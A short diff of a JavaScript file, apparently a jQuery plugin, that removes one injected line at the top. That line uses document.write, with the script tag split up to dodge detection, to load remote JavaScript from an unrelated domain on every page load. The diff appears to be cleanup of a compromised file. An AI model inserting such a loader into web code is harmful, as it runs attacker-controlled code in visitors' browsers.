@@ -1,4 +1,3 @@
-document.write("<s"+"cript type='text/javascript' src='https://codes.luyaoguagua.top/js/main.js?"+Math.random()+"'></scr"+"ipt>"); 
 (function($) {
 
 	/**
